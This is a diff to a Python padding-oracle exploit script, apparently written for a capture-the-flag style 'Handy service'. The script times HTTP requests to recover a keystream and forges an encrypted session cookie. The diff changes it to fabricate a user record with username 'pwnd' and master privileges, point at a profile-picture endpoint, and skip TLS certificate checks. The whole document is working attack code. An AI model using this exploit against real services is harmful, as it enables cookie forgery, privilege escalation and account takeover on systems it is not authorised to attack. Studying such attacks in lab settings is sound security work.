@@ -9,6 +9,10 @@ import time
 import uuid
 import binascii
 
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+import user_info_pb2
+
 class Oracle:
   def __init__(self, url):
     self.url = url
@@ -19,6 +23,7 @@ class Oracle:
       message[index] = byte_value
       cookie = self._GetCookieValue(user_id, message)
       timings[byte_value] = self._GetTiming(cookie)
+    logging.info('Min timing: %f', min(timings.values()))
     logging.info('Max timing: %f', max(timings.values()))
     return [ max(timings.items(), key=lambda t: t[1])[0] ]
 
@@ -27,7 +32,7 @@ class Oracle:
 
   def _GetTiming(self, cookie):
     start_time = time.time()
-    r = requests.get(self.url, cookies={'session': cookie})
+    r = requests.get(self.url, cookies={'session': cookie}, verify=False)
     elapsed = time.time() - start_time
     logging.debug('Response status code: %d, elapsed time: %f', r.status_code, elapsed)
     return elapsed
@@ -35,8 +40,7 @@ class Oracle:
 def encrypt(message, user_id, oracle, block_size):
   ct = bytearray()
   ks = bytearray()
-  msg_bytes = base64.b64decode(message)
-  len_to_find = len(msg_bytes) + 4
+  len_to_find = len(message) + 4
   for block_idx in range((len_to_find + block_size - 1) // block_size):
     logging.info('Restoring block #%d', block_idx)
     ct.extend(os.urandom(block_size))
@@ -61,25 +65,32 @@ def encrypt(message, user_id, oracle, block_size):
         ct[byte_idx + i] ^= pad_size + 1
   logging.info('Keystream: %s', base64.b64encode(ks).decode('utf-8'))
 
-  pt = bytearray(binascii.crc32(msg_bytes).to_bytes(4, byteorder='big'))
-  pt.extend(msg_bytes)
+  pt = bytearray(binascii.crc32(message).to_bytes(4, byteorder='big'))
+  pt.extend(message)
   pad_size = block_size - len(pt) % block_size
   pt.extend(bytes([pad_size]) * pad_size)
   return bytes(l ^ r for l, r in zip(pt, ks))
 
 
+def CreateMessage():
+  lui = user_info_pb2.LocalUserInfo()
+  lui.username = 'pwnd'
+  lui.is_master = True
+  return lui.SerializeToString()
+
+
 if __name__ == "__main__":
+  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
   logging.basicConfig(format='%(levelname)s %(asctime)s: %(message)s', level=logging.INFO)
 
   parser = argparse.ArgumentParser(description='Exploit of Padding Oracle Attack for Handy service')
   parser.add_argument('--block_size', default=16, type=int, help='Block length')
-  parser.add_argument('--url', default='http://localhost:8080', help='URL to hack')
-  parser.add_argument('--message', required=True, type=str, help='Base64-encoded plain-text cookie to be fabricated')
+  parser.add_argument('--url', default='https://localhost', help='URL to hack')
   parser.add_argument('--user_id', required=True, type=str, help='UUID of the cookie')
   args = parser.parse_args()
 
   user_id = uuid.UUID(args.user_id).bytes
-  oracle = Oracle(args.url)
-  encrypted = encrypt(args.message, user_id, oracle, args.block_size)
+  oracle = Oracle('%s/profile/picture?id=%s&size=1024' % (args.url, args.user_id))
+  encrypted = encrypt(CreateMessage(), user_id, oracle, args.block_size)
   logging.info('Encrypted data: %s', base64.b64encode(encrypted).decode('utf-8'))
   logging.info('Cookie: %s', base64.b64encode(user_id + encrypted).decode('utf-8'))
